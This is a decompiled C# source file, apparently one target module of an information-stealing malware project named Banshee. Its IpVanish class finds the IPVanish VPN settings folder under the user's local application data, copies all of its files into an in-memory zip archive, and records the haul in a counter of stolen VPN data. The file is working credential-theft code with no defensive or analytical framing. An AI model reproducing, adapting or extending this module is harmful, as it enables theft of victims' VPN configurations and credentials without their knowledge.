﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Vpn
{
	// Token: 0x0200002D RID: 45
	public class IpVanish : ITarget
	{
		// Token: 0x0600005D RID: 93 RVA: 0x00003F1C File Offset: 0x00003F1C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "IPVanish", "Settings");
			if (Directory.Exists(text))
			{
				string text2 = ZipPath.Vpn("IPVanish");
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "IPVanish";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
